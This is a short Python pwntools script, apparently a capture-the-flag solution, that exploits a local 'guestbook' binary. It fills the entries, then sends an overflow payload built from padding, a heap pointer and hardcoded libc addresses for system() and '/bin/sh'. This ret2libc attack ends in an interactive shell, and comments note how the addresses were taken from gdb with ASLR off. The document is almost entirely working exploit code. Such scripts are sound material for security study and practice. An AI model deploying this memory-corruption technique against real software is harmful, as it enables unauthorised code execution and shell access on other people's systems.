#! /usr/bin/env python

from pwn import *

s = process('./guestbook')

def write_payload(file_name): 
    print 'Writing payload to file : ', file_name
    f = open(file_name, 'wb')
    f.write(payload)
    f.close()

s.recvuntil('>>>')
s.sendline('AAAA')
s.recvuntil('>>>')
s.sendline('BBBB')
s.recvuntil('>>>')
s.sendline('CCCC')
s.recvuntil('>>>')
s.sendline('DDDD')

print s.recvuntil('>>')
s.sendline('2')
print s.recvuntil('>>>')
s.sendline('0')
print s.recvuntil('>>>')

#gdb.attach(s)

# from edb with aslr turned off
heap = 0x56558008

# just values from head to see in gdb if placed in correct place
#system = 0x43434343
#sh = 0x44444444

#from gdb with aslr off
# i functions system
# find "/bin/sh"
system = 0xf7e20fa0
sh = 0xf7f49768

# working payload for MY libc
p_test = 'A'* 100 + p32(0) * 2 + p32(heap) * 4  + '\x00' * 32 + p32(system) + 'RENT' + p32(sh)

s.sendline(p_test)
s.interactive()


